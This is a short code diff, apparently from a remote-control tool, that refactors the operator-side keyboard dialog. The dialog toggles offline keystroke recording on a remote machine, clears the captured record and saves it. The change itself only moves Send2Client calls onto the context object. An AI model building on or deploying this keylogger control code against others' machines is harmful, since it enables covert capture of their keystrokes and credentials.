@@ -78,7 +78,7 @@ BOOL CKeyBoardDlg::OnInitDialog()
 
     // 通知远程控制端对话框已经打开
     BYTE bToken = COMMAND_NEXT;
-    m_iocpServer->Send2Client(m_ContextObject, &bToken, sizeof(BYTE));
+    m_ContextObject->Send2Client(&bToken, sizeof(BYTE));
 
     return TRUE;  // return TRUE unless you set the focus to a control
     // EXCEPTION: OCX Property Pages should return FALSE
@@ -144,7 +144,7 @@ void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
         if (pSysMenu != NULL) {
             m_bIsOfflineRecord = !m_bIsOfflineRecord;
             BYTE bToken[] = { COMMAND_KEYBOARD_OFFLINE, m_bIsOfflineRecord };
-            m_iocpServer->Send2Client(m_ContextObject, bToken, sizeof(bToken));
+            m_ContextObject->Send2Client(bToken, sizeof(bToken));
             if (m_bIsOfflineRecord)
                 pSysMenu->CheckMenuItem(IDM_ENABLE_OFFLINE, MF_CHECKED);
             else
@@ -154,7 +154,7 @@ void CKeyBoardDlg::OnSysCommand(UINT nID, LPARAM lParam)
 
     } else if (nID == IDM_CLEAR_RECORD) {
         BYTE bToken = COMMAND_KEYBOARD_CLEAR;
-        m_iocpServer->Send2Client(m_ContextObject, &bToken, 1);
+        m_ContextObject->Send2Client(&bToken, 1);
         m_edit.SetWindowText("");
     } else if (nID == IDM_SAVE_RECORD) {
         SaveRecord();
